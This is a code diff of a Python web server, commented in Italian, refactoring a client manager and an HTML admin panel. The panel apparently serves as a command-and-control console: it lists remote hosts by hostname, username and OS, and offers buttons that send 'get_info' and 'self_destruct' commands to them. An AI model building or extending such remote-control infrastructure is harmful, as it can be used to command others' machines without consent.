@@ -32,12 +32,15 @@ class ClientManager:
                 client_id = self.device_to_client[device_id]
                 
                 # Aggiorna dati client
-                self.clients[client_id] = {
-                    **self.clients.get(client_id, {}),
-                    **client_data,
-                    "last_seen": datetime.now(),
-                    "device_id": device_id
-                }
+                if client_id in self.clients:
+                    self.clients[client_id].update(client_data)
+                    self.clients[client_id]["last_seen"] = datetime.now()
+                else:
+                    self.clients[client_id] = {
+                        **client_data,
+                        "last_seen": datetime.now(),
+                        "device_id": device_id
+                    }
                 
                 return client_id
             
@@ -100,8 +103,9 @@ class ClientManager:
     
     def list_clients(self):
         with self.lock:
-            return {
-                cid: {
+            result = {}
+            for cid, info in self.clients.items():
+                result[cid] = {
                     "hostname": info.get("hostname", "Unknown"),
                     "username": info.get("username", "Unknown"),
                     "os": info.get("os", "Unknown"),
@@ -111,8 +115,7 @@ class ClientManager:
                     "version": info.get("version", "Unknown"),
                     "is_installed": info.get("is_installed", False)
                 }
-                for cid, info in self.clients.items()
-            }
+            return result
 
 client_manager = ClientManager()
 
@@ -144,12 +147,46 @@ def home():
 def admin_panel():
     clients = client_manager.list_clients()
     
+    # Genera opzioni client per dropdown
     clients_options = ""
     for client_id, info in clients.items():
-        clients_options += f'''
-        <option value="{client_id}">
-            {client_id} - {info['hostname']} ({info['username']}) - {info['os']}
-        </option>'''
+        display_text = f"{client_id} - {info['hostname']} ({info['username']}) - {info['os']}"
+        clients_options += f'<option value="{client_id}">{display_text}</option>'
+    
+    # Genera righe tabella client
+    clients_rows = ""
+    for client_id, info in clients.items():
+        last_seen = info['last_seen']
+        if 'T' in last_seen:
+            last_seen_display = last_seen.split('T')[0]
+        else:
+            last_seen_display = last_seen
+        
+        clients_rows += f"""
+        <tr>
+            <td>{client_id}</td>
+            <td>{info['hostname']}</td>
+            <td>{info['username']}</td>
+            <td>{info['os']}</td>
+            <td>{last_seen_display}</td>
+            <td>
+                <form action="/api/send_command" method="post" style="display: inline;">
+                    <input type="hidden" name="client_id" value="{client_id}">
+                    <input type="hidden" name="command" value="get_info">
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px;">Info</button>
+                </form>
+                <form action="/api/send_command" method="post" style="display: inline;">
+                    <input type="hidden" name="client_id" value="{client_id}">
+                    <input type="hidden" name="command" value="self_destruct">
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545;">💣</button>
+                </form>
+            </td>
+        </tr>
+        """
+    
+    # Se nessun client
+    if not clients_rows:
+        clients_rows = '<tr><td colspan="6">Nessun client connesso</td></tr>'
     
     return f'''
     <!DOCTYPE html>
@@ -162,6 +199,9 @@ def admin_panel():
             textarea, input {{ width: 100%; margin: 5px 0; }}
             button {{ padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }}
             button:hover {{ background: #0056b3; }}
+            table {{ width: 100%; border-collapse: collapse; }}
+            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
+            th {{ background-color: #f2f2f2; }}
         </style>
     </head>
     <body>
@@ -238,7 +278,7 @@ def admin_panel():
         
         <div class="section">
             <h3>📊 Client Attivi ({len(clients)})</h3>
-            <table border="1" cellpadding="5" style="width: 100%; border-collapse: collapse;">
+            <table>
                 <tr>
                     <th>ID</th>
                     <th>Hostname</th>
@@ -247,28 +287,7 @@ def admin_panel():
                     <th>Ultimo visto</th>
                     <th>Azioni</th>
                 </tr>
-                {"".join([
-                    f'''<tr>
-                        <td>{cid}</td>
-                        <td>{info['hostname']}</td>
-                        <td>{info['username']}</td>
-                        <td>{info['os']}</td>
-                        <td>{info['last_seen'].split('T')[0] if 'T' in info['last_seen'] else info['last_seen']}</td>
-                        <td>
-                            <form action="/api/send_command" method="post" style="display: inline;">
-                                <input type="hidden" name="client_id" value="{cid}">
-                                <input type="hidden" name="command" value="get_info">
-                                <button type="submit" style="padding: 3px 8px; font-size: 12px;">Info</button>
-                            </form>
-                            <form action="/api/send_command" method="post" style="display: inline;">
-                                <input type="hidden" name="client_id" value="{cid}">
-                                <input type="hidden" name="command" value="self_destruct">
-                                <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545;">💣</button>
-                            </form>
-                        </td>
-                    </tr>'''
-                    for cid, info in clients.items()
-                ]) if clients else '<tr><td colspan="6">Nessun client connesso</td></tr>'}
+                {clients_rows}
             </table>
         </div>
         
